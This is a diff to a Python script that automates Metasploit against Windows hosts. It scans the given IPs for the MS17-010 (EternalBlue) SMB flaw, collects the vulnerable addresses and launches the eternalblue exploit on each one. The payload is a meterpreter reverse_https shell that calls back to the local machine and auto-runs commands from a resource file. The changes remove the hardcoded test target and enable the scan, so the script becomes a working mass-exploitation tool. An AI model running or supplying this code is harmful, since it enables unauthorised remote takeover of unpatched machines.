@@ -12,12 +12,13 @@ def get_local_ip():
 
 def attack(target):
 	attack_cmd = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; spool '+ spool_log + '; set RHOST ' + target + \
-		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; run; show sessions; sessions -i 1;"'
+		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; set AutoRunScript multi_console_command -r ' \
+		 + os.getcwd() + '/commands.rc; show options; run;"'
 	print attack_cmd
 	os.system(attack_cmd)
 
 def parse_scan_log():
-	global ip_to_hack
+	global IPs_to_hack
 
 	scannerFile = open ("scanner.log", "r")
 
@@ -27,6 +28,8 @@ def parse_scan_log():
 			IPs_to_hack.append(get_ip[0])
 
 	print(IPs_to_hack)
+
+	# return IPs_to_hack
 
 
 
@@ -41,26 +44,26 @@ print "Target IP Address(es):", targets
 scan_log = "scanner.log"
 spool_log = "spool.log"
 
-scan_cmd = 'msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; run; exit" | tee ' + scan_log
+scan_cmd = 'msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; show options; run; exit" | tee ' + scan_log
 
 # local_ip = socket.gethostbyname(socket.gethostname()) #simple way
 local_ip = get_local_ip()
 print "Local IP address:", local_ip
 
 print scan_cmd
-
-# os.system(scan_cmd)
+# print "Skipping scan..."
+os.system(scan_cmd)
 # print open(scan_log, 'r').read()
 
-exploitable = True #TODO
+parse_scan_log()
+
+exploitable = len(IPs_to_hack) > 0
 
 if not exploitable:
 	print "No vulnerable targets"
 	sys.exit()
 
-targets = ["192.168.0.107"] #TODO
-
-for target in targets:
+for target in IPs_to_hack:
 	attack(target)
 
 
